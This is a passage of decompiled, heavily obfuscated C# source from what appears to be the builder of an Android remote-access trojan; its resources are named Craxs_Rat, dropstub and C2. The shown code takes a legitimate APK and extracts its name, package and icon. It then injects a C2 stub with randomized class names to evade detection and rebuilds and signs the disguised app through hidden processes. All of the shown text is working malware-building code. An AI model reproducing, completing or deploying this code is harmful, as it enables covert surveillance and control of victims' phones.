              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        ((Editor) this)._Button2 = value;
        button2 = ((Editor) this)._Button2;
        num1 = button2 == null ? 1604532306 : (num1 = 1105670805);
        goto label_2;
      }
    }

    internal virtual Panel Panel3
    {
      get => ((Editor) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Editor) this)._Panel3 = value;
    }

    internal virtual RichTextBox logtext
    {
      get => ((Editor) this)._logtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Editor) this)._logtext = value;
    }

    internal virtual BackgroundWorker WorkWorker
    {
      get => ((Editor) this)._WorkWorker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.WorkWorker_DoWork);
        BackgroundWorker workWorker = ((Editor) this)._WorkWorker;
        if (workWorker == null)
          goto label_6;
label_1:
        int num1 = 1951028357;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(-(num1 + -(~(592156297 - -321015579) - (-976289362 * 1367678057 ^ -745154878 - 1341928434) - -1396687419)) ^ ~(-1505924037 * 1330864170) ^ ~653978734 + (1126189473 + 400204529)) ^ 1606339421)) % 7U)
          {
            case 0:
              goto label_6;
            case 1:
              workWorker = ((Editor) this)._WorkWorker;
              num1 = (int) num2 * 1717067647 ^ -1398543937;
              continue;
            case 2:
              goto label_1;
            case 3:
              workWorker.DoWork += workEventHandler;
              num1 = (int) num2 * -213731527 ^ -392986481;
              continue;
            case 4:
              int num3 = workWorker == null ? 1056318581 : (num3 = 692833267);
              num1 = num3 ^ (int) num2 * -609592850;
              continue;
            case 5:
              workWorker.DoWork -= workEventHandler;
              num1 = (int) num2 * 1663963343 ^ -128396104;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_6:
        ((Editor) this)._WorkWorker = value;
        num1 = -1847747254;
        goto label_2;
      }
    }

    internal virtual Button Button3
    {
      get => ((Editor) this)._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        Button button3 = ((Editor) this)._Button3;
label_1:
        int num1 = -1937848425;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -1743423285 - (1314951803 * -1430597685 + ~(-2071879061 * -828523243)) - ~~(545387208 - 1198537743)) * 7912395)) % 8U)
          {
            case 0:
              button3.Click += eventHandler;
              num1 = (int) num2 * -2082854161 ^ -821258478;
              continue;
            case 1:
              int num3 = button3 == null ? -737271598 : (num3 = -19089645);
              num1 = num3 ^ (int) num2 * 806477286;
              continue;
            case 2:
              button3 = ((Editor) this)._Button3;
              num1 = (int) num2 * 2080906634 ^ 839204093;
              continue;
            case 3:
              int num4 = button3 == null ? -108417051 : (num4 = -1859750023);
              num1 = num4 ^ (int) num2 * 53556829;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              ((Editor) this)._Button3 = value;
              num1 = -1276570936;
              continue;
            case 7:
              button3.Click -= eventHandler;
              num1 = (int) num2 * 1543834413 ^ 893977751;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    private void Selectapkbtn_Click(object sender, EventArgs e)
    {
      if (!this.BackgroundWorker1.IsBusy)
        goto label_9;
label_1:
      int num1 = -1204648893;
label_2:
      OpenFileDialog openFileDialog;
      while (true)
      {
        int num2 = num1;
        uint num3;
        DialogResult dialogResult;
        switch ((num3 = (uint) ~(-2015325452 - -(num2 + 392029041 * ~(~-2124642957 - ~683097462 ^ 1949414118 ^ 1108820997 ^ -1061369443)))) % 14U)
        {
          case 0:
            goto label_1;
          case 1:
            ((Editor) this).TargetAPKPATH = openFileDialog.FileName;
            int num4 = this.BackgroundWorker1.IsBusy ? -948843297 : (num4 = -202777302);
            num1 = num4 ^ (int) num3 * -109476066;
            continue;
          case 2:
            ((Editor) this).originalapkname = Path.GetFileName(openFileDialog.FileName);
            num1 = -2014160158;
            continue;
          case 3:
            goto label_9;
          case 4:
            this.TapkText.Text = openFileDialog.FileName;
            num1 = 1625223084;
            continue;
          case 5:
            int num5 = dialogResult == DialogResult.OK ? -1041617303 : (num5 = -797046293);
            num1 = num5 ^ (int) num3 * -176640600;
            continue;
          case 6:
            CraxsAlert.Showinformation(EXGuarder.\u00355386D15);
            num1 = (int) num3 * 2097201456 ^ -1392245626;
            continue;
          case 7:
            dialogResult = openFileDialog.ShowDialog();
            num1 = (int) num3 * 1028426626 ^ 622534458;
            continue;
          case 8:
            this.TapkText.Text = EXGuarder.\u00327033C1E;
            num1 = (int) num3 * -1057007694 ^ 1150339150;
            continue;
          case 9:
            goto label_3;
          case 10:
            openFileDialog.RestoreDirectory = true;
            num1 = (int) num3 * 345118252 ^ -304206586;
            continue;
          case 11:
            this.BackgroundWorker1.RunWorkerAsync();
            num1 = (int) num3 * -1368407851 ^ -441474984;
            continue;
          case 12:
            openFileDialog.Title = EXGuarder.\u00315152F20;
            num1 = (int) num3 * -1075724820 ^ 468931172;
            continue;
          case 13:
            openFileDialog.Filter = EXGuarder.\u0031D2F4678;
            num1 = (int) num3 * 1321808152 ^ -88157191;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:
      return;
label_9:
      openFileDialog = new OpenFileDialog();
      num1 = -1475050933;
      goto label_2;
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      if (string.IsNullOrEmpty(((Editor) this).TargetAPKPATH))
        return;
label_1:
      int num1 = 1788099993;
      string sdkNumber1;
      string sdkNumber2;
      // ISSUE: variable of a compiler-generated type
      Drooper._Closure\u0024__77\u002D0 TargetObject;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(num1 * -47520201 - (1384762512 - 1317605038 - 1338579169 ^ -353031112 ^ 1705548316)) - 676586154 - -823208938)) % 15U)
        {
          case 0:
            Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0034D682537, ((Editor) this).APKINFO));
            num1 = (int) num2 * 296251492 ^ 717770667;
            continue;
          case 1:
            sdkNumber1 = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0036D306017, ((Editor) this).APKINFO));
            num1 = (int) num2 * 1462112969 ^ 2075895362;
            continue;
          case 2:
            ((Faker) TargetObject).\u0024VB\u0024Local_appname = Codes.ExtractName(((Editor) this).TargetAPKPATH);
            num1 = -1852258596;
            continue;
          case 3:
            this.apkicon.Image = (Image) null;
            num1 = (int) num2 * 2049344489 ^ 1094637730;
            continue;
          case 4:
            Codes.GetAndroidVersionName(sdkNumber1);
            sdkNumber2 = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u00324384A66, ((Editor) this).APKINFO));
            num1 = (int) num2 * -1770713790 ^ 2135519133;
            continue;
          case 6:
            this.apkicon.Image.Dispose();
            num1 = (int) num2 * 438705579 ^ 1527979409;
            continue;
          case 7:
            ((FileManager) TargetObject).\u0024VB\u0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u00372371226, ((Editor) this).APKINFO));
            num1 = (int) num2 * 662706015 ^ -1985988531;
            continue;
          case 8:
            goto label_1;
          case 9:
            Codes.GetAndroidVersionName(sdkNumber2);
            num1 = (int) num2 * 163416481 ^ -548159719;
            continue;
          case 10:
            if (string.IsNullOrEmpty(((Faker) TargetObject).\u0024VB\u0024Local_appname))
            {
              num1 = (int) num2 * 1880142872 ^ 154830773;
              continue;
            }
            goto label_37;
          case 11:
            int num3 = this.apkicon.Image == null ? 1340973316 : (num3 = -1300834245);
            num1 = num3 ^ (int) num2 * 1055109602;
            continue;
          case 12:
            Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0031A3D5E61, ((Editor) this).APKINFO));
            num1 = (int) num2 * 1110739566 ^ -951117010;
            continue;
          case 13:
            ((Editor) this).APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u0033E144F2A), EXGuarder.\u00311545B66 + ((Editor) this).TargetAPKPATH + EXGuarder.\u0033521662E);
            num1 = (int) num2 * -1624446117 ^ -173575677;
            continue;
          case 14:
            TargetObject = (Drooper._Closure\u0024__77\u002D0) new Drooper.addLogback(TargetObject);
            ((FileManager) TargetObject).\u0024VB\u0024Me = this;
            num1 = (int) num2 * 1942051728 ^ -1591610512;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      MatchCollection matchCollection = Regex.Matches(((Editor) this).APKINFO, EXGuarder.\u00343084F71);
      IEnumerator enumerator;
      if (matchCollection.Count > 0)
      {
        try
        {
          enumerator = matchCollection.GetEnumerator();
label_19:
          int num4 = -3930379;
          string str;
          System.Text.RegularExpressions.Match current;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) (-~(num4 * -47520201 - (1384762512 - 1317605038 - 1338579169 ^ -353031112 ^ 1705548316)) - 676586154 - -823208938)) % 8U)
            {
              case 0:
                current = (System.Text.RegularExpressions.Match) enumerator.Current;
                num4 = -2006886678;
                continue;
              case 2:
                str = current.Groups[1].Value;
                num4 = (int) num5 * 893660405 ^ -483081028;
                continue;
              case 3:
                ((Faker) TargetObject).\u0024VB\u0024Local_appname = str;
                num4 = (int) num5 * -901756085 ^ 1205972257;
                continue;
              case 4:
                int num6;
                num4 = num6 = enumerator.MoveNext() ? -2008931660 : (num6 = -685771549);
                continue;
              case 5:
                goto label_19;
              case 6:
                Console.WriteLine(EXGuarder.\u0034F576B19 + str);
                num4 = (int) num5 * 401503302 ^ 630097317;
                continue;
              case 7:
                num4 = (int) num5 * -867590596 ^ -918328236;
                continue;
              default:
                goto label_37;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_28:
            int num7 = 1421882567;
            while (true)
            {
              uint num8;
              switch ((num8 = (uint) (-~(num7 * -47520201 - (1384762512 - 1317605038 - 1338579169 ^ -353031112 ^ 1705548316)) - 676586154 - -823208938)) % 3U)
              {
                case 0:
                  goto label_28;
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num7 = (int) num8 * 512033409 ^ -1222738837;
                  continue;
                default:
                  goto label_32;
              }
            }
          }
label_32:;
        }
      }
      else
        ((Faker) TargetObject).\u0024VB\u0024Local_appname = EXGuarder.\u0036A4A0D09;
label_34:
      int num9 = 56639239;
label_35:
      string language;
      string path;
      string[] pngs;
      int index;
      string directoryName;
      string str1;
      string str2;
      while (true)
      {
        uint num10;
        switch ((num10 = (uint) (-~(num9 * -47520201 - (1384762512 - 1317605038 - 1338579169 ^ -353031112 ^ 1705548316)) - 676586154 - -823208938)) % 21U)
        {
          case 0:
            int num11 = Operators.CompareString(language, EXGuarder.\u0031A004077, false) == 0 ? -1302682557 : (num11 = 1585664141);
            num9 = num11 ^ (int) num10 * -1889146586;
            continue;
          case 1:
            int num12 = Operators.CompareString(language, EXGuarder.\u003664D4B18, false) == 0 ? 1401540251 : (num12 = -1416212861);
            num9 = num12 ^ (int) num10 * 263244586;
            continue;
          case 2:
            goto label_37;
          case 3:
            string newValue = pngs[index];
            str1 = path.Replace(EXGuarder.\u00321205C75, newValue).Replace(EXGuarder.\u00357377862, newValue);
            num9 = 707740350;
            continue;
          case 4:
            path = Conversions.ToString(Codes.RegexMatcher(EXGuarder.\u0036E2E4A3D, ((Editor) this).APKINFO));
            num9 = 1296923208;
            continue;
          case 5:
            path = path.Replace(EXGuarder.\u00334766673, EXGuarder.\u0033605050F);
            num9 = (int) num10 * -1623528401 ^ 30210800;
            continue;
          case 6:
            num9 = (int) num10 * 2015846683 ^ 356512594;
            continue;
          case 7:
            directoryName = Path.GetDirectoryName(str2);
            num9 = (int) num10 * -1932802538 ^ 1152632661;
            continue;
          case 8:
            int num13;
            num9 = num13 = index < pngs.Length ? -731843922 : (num13 = 289805248);
            continue;
          case 9:
            Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u003351E0065), EXGuarder.\u00346234E07 + ((Editor) this).TargetAPKPATH + EXGuarder.\u00321675B1B + path + EXGuarder.\u0030C3E3016 + directoryName + EXGuarder.\u003252F1654);
            num9 = -2068583378;
            continue;
          case 10:
            goto label_34;
          case 11:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__2)));
            num9 = (int) num10 * -653618049 ^ 1202676978;
            continue;
          case 12:
            str2 = Codes.TempPathCache + ((FileManager) TargetObject).\u0024VB\u0024Local_PackageName + EXGuarder.\u00341442831 + path;
            num9 = 1035483251;
            continue;
          case 13:
            num9 = (int) num10 * -424263914 ^ 1962561478;
            continue;
          case 14:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__1)));
            num9 = 2103749665;
            continue;
          case 15:
            Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u003351E0065), EXGuarder.\u00346234E07 + ((Editor) this).TargetAPKPATH + EXGuarder.\u00321675B1B + str1 + EXGuarder.\u0030C3E3016 + directoryName + EXGuarder.\u003252F1654);
            checked { ++index; }
            num9 = (int) num10 * 1673818262 ^ 207841282;
            continue;
          case 16:
            int num14 = !path.Contains(EXGuarder.\u0036E360E13) ? -2026403202 : (num14 = -587019609);
            num9 = num14 ^ (int) num10 * -1687823577;
            continue;
          case 17:
            int num15 = Operators.CompareString(Path.GetExtension(path), EXGuarder.\u00334766673, false) != 0 ? 2059833414 : (num15 = 791369058);
            num9 = num15 ^ (int) num10 * 585080424;
            continue;
          case 19:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
            num9 = 2103749665;
            continue;
          case 20:
            pngs = Codes.pngs;
            index = 0;
            num9 = (int) num10 * -1196146520 ^ -2045132144;
            continue;
          default:
            goto label_56;
        }
      }
label_56:
      Codes.ProcessStartWithOutput(Codes.RealPath(EXGuarder.\u003351E0065), EXGuarder.\u00346234E07 + ((Editor) this).TargetAPKPATH + EXGuarder.\u00300550F2E + Codes.TempPathCache + ((FileManager) TargetObject).\u0024VB\u0024Local_PackageName + EXGuarder.\u00319336115);
      try
      {
        this.apkicon.Image = Image.FromFile(str2);
        ((Editor) this).TargetApkicon = str2;
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_59:
        int num16 = 266014194;
        while (true)
        {
          uint num17;
          switch ((num17 = (uint) (-~(num16 * -47520201 - (1384762512 - 1317605038 - 1338579169 ^ -353031112 ^ 1705548316)) - 676586154 - -823208938)) % 4U)
          {
            case 0:
              goto label_36;
            case 1:
              ProjectData.ClearProjectError();
              num16 = (int) num17 * -1803184298 ^ -447733890;
              continue;
            case 2:
              this.apkicon.Image = (Image) Craxs_Rat.My.Resources.Resources.noicon;
              ((Editor) this).TargetApkicon = (string) null;
              num16 = (int) num17 * 596378700 ^ -697230113;
              continue;
            case 3:
              goto label_59;
            default:
              goto label_30;
          }
        }
label_36:
        return;
label_30:
        return;
      }
label_37:
      language = RegistryHandler.Get_Language();
      num9 = 228655933;
      goto label_35;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
label_1:
      int num1 = 1099117752;
      DialogResult dialogResult;
      Bitmap bitmap;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(num1 ^ ~~(-1040087943 - (813082840 - 60847975) - (-630423183 - (580830753 - -681187987))))) % 10U)
        {
          case 0:
            ((Editor) this).TargetApkicon = openFileDialog.FileName;
            num1 = (int) num2 * 1765613324 ^ -1620735145;
            continue;
          case 1:
            dialogResult = openFileDialog.ShowDialog();
            num1 = (int) num2 * -641528212 ^ 1078987381;
            continue;
          case 2:
            openFileDialog.Title = EXGuarder.\u003342D7621;
            openFileDialog.Filter = EXGuarder.\u003121A2D22;
            openFileDialog.RestoreDirectory = true;
            num1 = (int) num2 * -1596094576 ^ -275997495;
            continue;
          case 3:
            goto label_3;
          case 4:
            bitmap = new Bitmap(Image.FromFile(openFileDialog.FileName));
            num1 = 1576284077;
            continue;
          case 5:
            int num3 = dialogResult == DialogResult.OK ? -1806050314 : (num3 = -230709050);
            num1 = num3 ^ (int) num2 * 1032259642;
            continue;
          case 6:
            num1 = (int) num2 * 1821328676 ^ -1807336489;
            continue;
          case 7:
            goto label_1;
          case 8:
            ((Editor) this).TargetApkicon = (string) null;
            num1 = (int) num2 * -842237384 ^ -593157604;
            continue;
          case 9:
            this.apkicon.Image = (Image) bitmap;
            num1 = (int) num2 * 1971240290 ^ -1927962014;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    public void LogBack(object[] objs)
    {
      if (!this.InvokeRequired)
        goto label_8;
label_1:
      int num1 = -1165684235;
label_2:
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(-num1 * -2133340815 * -1353441961) - 279514810)) % 8U)
        {
          case 0:
            this.logtext.ScrollToCaret();
            num1 = (int) num2 * -1981770241 ^ 268104078;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            // ISSUE: method pointer
            this.Invoke((Delegate) new Drooper((object) this, __methodptr(LogBack)), (object) objs);
            num1 = (int) num2 * 914738233 ^ -641056568;
            continue;
          case 4:
            this.logtext.Select();
            num1 = (int) num2 * -1465802727 ^ -994689969;
            continue;
          case 5:
            this.logtext.SelectionStart = Strings.Len(this.logtext.Text);
            num1 = (int) num2 * 753435751 ^ -528480079;
            continue;
          case 6:
            goto label_8;
          case 7:
            this.logtext.AppendText(EXGuarder.\u0030D184766 + str + EXGuarder.\u00304322950);
            num1 = (int) num2 * -737470281 ^ 1726479614;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_8:
      str = Conversions.ToString(objs[0]);
      num1 = -902754831;
      goto label_2;
    }

    public void log(string Str)
    {
      this.LogBack(new object[1]{ (object) Str });
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (this.WorkWorker == null)
        goto label_22;
label_1:
      int num1 = 2082166415;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        ProcessStartInfo processStartInfo;
        switch ((num3 = (uint) (((268987620 - -1415311899 + 716598654 ^ 304317959 + -1496611640) - (num2 - ~(-577923348 * -1556898623 ^ -200285727) + ~-~--501816371)) * 1726680187 - 347841140)) % 24U)
        {
          case 0:
            ((Editor) this).cmdProcess.BeginOutputReadLine();
            ((Editor) this).cmdProcess.BeginErrorReadLine();
            this.log(EXGuarder.\u00357512A73);
            num1 = (int) num3 * -2122884731 ^ -697111982;
            continue;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u0034E08516E);
            num1 = (int) num3 * -556087155 ^ -1561343439;
            continue;
          case 2:
            int num4 = !this.WorkWorker.IsBusy ? -1937323327 : (num4 = 2015538067);
            num1 = num4 ^ (int) num3 * 365406904;
            continue;
          case 3:
            this.WorkWorker.RunWorkerAsync();
            ((Editor) this).cmdProcess = new Process();
            num1 = -16440072;
            continue;
          case 4:
            goto label_22;
          case 5:
            ((Editor) this).cmdProcess.OutputDataReceived += new DataReceivedEventHandler(this.cmdOutputHandler);
            ((Editor) this).cmdProcess.ErrorDataReceived += new DataReceivedEventHandler(this.cmdOutputHandler);
            num1 = (int) num3 * 14772703 ^ -215794856;
            continue;
          case 6:
            CraxsAlert.Showinformation(EXGuarder.\u003375B1C00);
            num1 = (int) num3 * 792171617 ^ 752049590;
            continue;
          case 7:
            processStartInfo.FileName = EXGuarder.\u00363084902;
            num1 = (int) num3 * -2095511755 ^ -401006986;
            continue;
          case 8:
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            num1 = (int) num3 * -903814062 ^ 153007539;
            continue;
          case 9:
            CraxsAlert.Showinformation(EXGuarder.\u0035C37455B);
            num1 = (int) num3 * -1123643851 ^ -1849623747;
            continue;
          case 10:
            int num5;
            num1 = num5 = !string.IsNullOrEmpty(((Editor) this).TargetApkicon) ? -1738227161 : (num5 = -561998886);
            continue;
          case 11:
            processStartInfo.CreateNoWindow = true;
            num1 = (int) num3 * -443201187 ^ -242673430;
            continue;
          case 12:
            processStartInfo.RedirectStandardInput = true;
            processStartInfo.RedirectStandardError = true;
            processStartInfo.UseShellExecute = false;
            num1 = (int) num3 * -1569204287 ^ -518078848;
            continue;
          case 13:
            CraxsAlert.Showinformation(EXGuarder.\u00312456E29);
            num1 = (int) num3 * 313065042 ^ 365633698;
            continue;
          case 14:
            ((Editor) this).cmdProcess.Start();
            num1 = (int) num3 * 71675302 ^ 700374089;
            continue;
          case 15:
            goto label_3;
          case 16:
            processStartInfo.RedirectStandardOutput = true;
            num1 = (int) num3 * -1645676547 ^ -500565279;
            continue;
          case 17:
            this.ExecuteCommand(EXGuarder.\u00305180439);
            num1 = (int) num3 * 1518485579 ^ 2073200187;
            continue;
          case 18:
            int num6;
            num1 = num6 = !(string.IsNullOrEmpty(this.textpkgname.Text) | string.IsNullOrEmpty(this.textappname.Text)) ? -274212276 : (num6 = 1518340234);
            continue;
          case 19:
            num1 = (int) num3 * -1835623636 ^ 1591705068;
            continue;
          case 20:
            ((Editor) this).cmdProcess.StartInfo = processStartInfo;
            num1 = (int) num3 * -2141124177 ^ -411683254;
            continue;
          case 21:
            goto label_1;
          case 22:
            ((Editor) this).cmdProcess.EnableRaisingEvents = true;
            num1 = (int) num3 * -69328969 ^ 137942627;
            continue;
          case 23:
            processStartInfo = new ProcessStartInfo();
            num1 = (int) num3 * 354998222 ^ 1402960354;
            continue;
          default:
            goto label_26;
        }
      }
label_3:
      return;
label_26:
      return;
label_22:
      num1 = !string.IsNullOrEmpty(((Editor) this).TargetAPKPATH) ? 2009551791 : (num1 = -1124862042);
      goto label_2;
    }

    private void S() => Thread.Sleep(1000);

    private void WorkWorker_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        this.log(EXGuarder.\u00347120259);
label_1:
        int num1 = 50748082;
        while (true)
        {
          int num2 = num1;
          uint num3;
          int index;
          string[] strArray;
          string path;
          string contents1;
          string contents2;
          string newValue1;
          string str1;
          string command1;
          string str2;
          string newValue2;
          string[] files;
          string str3;
          string contents3;
          string command2;
          int num4;
          string command3;
          string str4;
          string driv;
          string str5;
          string str6;
          switch ((num3 = (uint) (1883163502 - (--(num2 - -194766007 * ~(-1994871076 * 176051461 ^ 1185469973 * -1016221760) * -180678181) ^ 1656671395 * (819456667 - 105603819) ^ -2030635500 - 1885205705))) % 91U)
          {
            case 0:
              this.log(EXGuarder.\u0030D1E7119);
              num1 = (int) num3 * -2140687781 ^ -625297738;
              continue;
            case 1:
              ((Faker) this).N_Class3 = this.RandommMadv2(30);
              num1 = (int) num3 * -1977403986 ^ 1166858089;
              continue;
            case 2:
              int num5;
              num1 = num5 = ((Faker) this).HoldExtract ? -282790767 : (num5 = -1329412730);
              continue;
            case 3:
              this.S();
              num1 = -1164932767;
              continue;
            case 4:
              int num6 = !File.Exists(str4) | Codes.FileInUse(str4) | Codes.FileInUse(str3) ? -469070384 : (num6 = -1401230865);
              num1 = num6 ^ (int) num3 * -716064760;
              continue;
            case 5:
              File.WriteAllBytes(Settings.Junkpath, Craxs_Rat.My.Resources.Resources.junk);
              num1 = (int) num3 * -143894876 ^ 1826603872;
              continue;
            case 6:
              num4 = 1;
              num1 = (int) num3 * 217011390 ^ 1589056847;
              continue;
            case 7:
              this.log(EXGuarder.\u0036D3C0675);
              num1 = (int) num3 * -1865690608 ^ 1577474737;
              continue;
            case 8:
              Process.Start(((Editor) this).outputpath);
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__113\u002D0)));
              num1 = (int) num3 * -1348355723 ^ 672966018;
              continue;
            case 9:
              ((Faker) this).N_Class4 = this.RandommMadv2(30);
              num1 = (int) num3 * -443467832 ^ 1720447633;
              continue;
            case 10:
              ((Editor) this).buildapkpath = ((Editor) this).outputpath + EXGuarder.\u003482B7507;
              num1 = (int) num3 * 1666397042 ^ 987114611;
              continue;
            case 11:
              File.Copy(((Editor) this).TargetAPKPATH, ((EditSocket) this).BASEPATH);
              num1 = -73700845;
              continue;
            case 12:
              int num7 = ((Faker) this).Waitprotect | Codes.FileInUse(str3) ? -742798427 : (num7 = -1957328109);
              num1 = num7 ^ (int) num3 * 1077375117;
              continue;
            case 13:
              File.Delete(((Editor) this).buildapkpath);
              this.log(EXGuarder.\u00376051D6E);
              str3 = str1.Replace(EXGuarder.\u003430F0E64, EXGuarder.\u00308282E0E);
              num1 = (int) num3 * 1132844575 ^ -1816687621;
              continue;
            case 14:
              File.WriteAllBytes(((EditSocket) this).C, Craxs_Rat.My.Resources.Resources.C2);
              num1 = (int) num3 * 804879695 ^ -708307175;
              continue;
            case 15:
              this.log(EXGuarder.\u00370366B03);
              num1 = (int) num3 * -701152332 ^ -1797426961;
              continue;
            case 16:
              this.ExecuteCommand(command1);
              num1 = (int) num3 * 2098059841 ^ 364403986;
              continue;
            case 17:
              File.WriteAllBytes(((EditSocket) this).Apkeditorpath, Craxs_Rat.My.Resources.Resources.APKEditor);
              File.WriteAllBytes(((EditSocket) this).STUBPATH + EXGuarder.\u00350423E54, Craxs_Rat.My.Resources.Resources.dropstub);
              ZipFile.ExtractToDirectory(((EditSocket) this).STUBPATH + EXGuarder.\u00350423E54, ((EditSocket) this).STUBPATH);
              num1 = (int) num3 * 976624605 ^ -1709585449;
              continue;
            case 18:
              this.ExecuteCommand(command3);
              num1 = (int) num3 * -347631358 ^ 1872855786;
              continue;
            case 19:
              this.S();
              num1 = 358459201;
              continue;
            case 20:
              ((Editor) this).outputpath = ((Editor) this).WorkDIR + EXGuarder.\u00328786D70;
              num1 = (int) num3 * 1104124808 ^ -1936791900;
              continue;
            case 21:
              File.Delete(((EditSocket) this).stubicon);
              num1 = (int) num3 * 716477204 ^ 1089972024;
              continue;
            case 22:
              File.Delete(str1);
              num1 = (int) num3 * -373138411 ^ -2008060601;
              continue;
            case 23:
              str2 = File.ReadAllText(Settings.Junkpath);
              ((Faker) this).N_Class1 = this.RandommMadv2(30);
              num1 = 1638843546;
              continue;
            case 24:
              File.WriteAllText(((EditSocket) this).stringspath, contents2);
              num1 = (int) num3 * 1867745465 ^ 2108563946;
              continue;
            case 25:
              ((Editor) this).WorkDIR = Codes.GenerateRandomFolderName(EXGuarder.\u0033F0A5C0D);
              num1 = 1493032788;
              continue;
            case 26:
              checked { ++index; }
              num1 = (int) num3 * -157439996 ^ 954043924;
              continue;
            case 27:
              files = Directory.GetFiles(((EditSocket) this).STUBPATH + EXGuarder.\u00341604B11);
              int num8 = File.Exists(Settings.Junkpath) ? 249907285 : (num8 = -115650385);
              num1 = num8 ^ (int) num3 * 768310153;
              continue;
            case 28:
              num1 = (int) num3 * -1886834620 ^ 1243567616;
              continue;
            case 29:
              ((EditSocket) this).K = ((Editor) this).WorkDIR + EXGuarder.\u0035D013727;
              num1 = (int) num3 * 1565199766 ^ -1970290643;
              continue;
            case 30:
              this.log(EXGuarder.\u0036072144E);
              this.S();
              this.log(EXGuarder.\u0034C740B21);
              num1 = (int) num3 * -977751588 ^ -2063688461;
              continue;
            case 31:
              this.S();
              num1 = (int) num3 * 698733697 ^ 431984097;
              continue;
            case 32:
              int num9;
              num1 = num9 = index < strArray.Length ? -392973462 : (num9 = -280410445);
              continue;
            case 33:
              path = strArray[index];
              contents1 = File.ReadAllText(path).Replace(EXGuarder.\u0032E792074, this.textpkgname.Text).Replace(((EditSocket) this).ClassGen1, ((Faker) this).N_Class1).Replace(((EditSocket) this).ClassGen2, ((Faker) this).N_Class2).Replace(((EditSocket) this).ClassGen3, ((Faker) this).N_Class3).Replace(((EditSocket) this).ClassGen4, ((Faker) this).N_Class4).Replace(((Faker) this).ClassGen5, ((Faker) this).N_Class5);
              num1 = -1180344573;
              continue;
            case 34:
              ((Faker) this).firsttry = true;
              Codes.DirectoryDeleteLong(((Editor) this).WorkDIR);
              num1 = (int) num3 * 1307578396 ^ 2117049719;
              continue;
            case 35:
              int num10 = num4 <= 50 ? 1495739252 : (num10 = -90498126);
              num1 = num10 ^ (int) num3 * 1868291583;
              continue;
            case 36:
              this.S();
              int num11;
              num1 = num11 = !File.Exists(str1) | Codes.FileInUse(str1) ? -1735833996 : (num11 = -1621415923);
              continue;
            case 37:
              Directory.CreateDirectory(((Editor) this).WorkDIR + EXGuarder.\u0031C312331);
              num1 = (int) num3 * 1620427787 ^ 2001425077;
              continue;
            case 38:
              Thread.Sleep(3000);
              num1 = (int) num3 * 1445490979 ^ -944313924;
              continue;
            case 39:
              int num12 = ((Faker) this).Waitbuild ? 2106407993 : (num12 = 613296609);
              num1 = num12 ^ (int) num3 * -700788269;
              continue;
            case 40:
              this.S();
              num1 = (int) num3 * 285252544 ^ -1132409550;
              continue;
            case 41:
              ((EditSocket) this).Apkeditorpath = ((Editor) this).WorkDIR + EXGuarder.\u003212D6D5E;
              num1 = (int) num3 * 385509865 ^ 528832441;
              continue;
            case 42:
              ((EditSocket) this).apktoolpath = ((Editor) this).WorkDIR + EXGuarder.\u0036479753E;
              ((EditSocket) this).Apksignerpath = ((Editor) this).WorkDIR + EXGuarder.\u003454D7670;
              num1 = -1445220175;
              continue;
            case 43:
              this.S();
              num1 = (int) num3 * -501444333 ^ 1249273577;
              continue;
            case 44:
              int num13;
              num1 = num13 = Directory.Exists(((Editor) this).WorkDIR) ? -43075446 : (num13 = 172686234);
              continue;
            case 45:
              this.log(EXGuarder.\u003302C0C4F);
              num1 = (int) num3 * 1701835232 ^ 1020047663;
              continue;
            case 46:
              File.WriteAllText(((EditSocket) this).MainfistPath, contents3);
              strArray = files;
              num1 = (int) num3 * 637552975 ^ -316203478;
              continue;
            case 47:
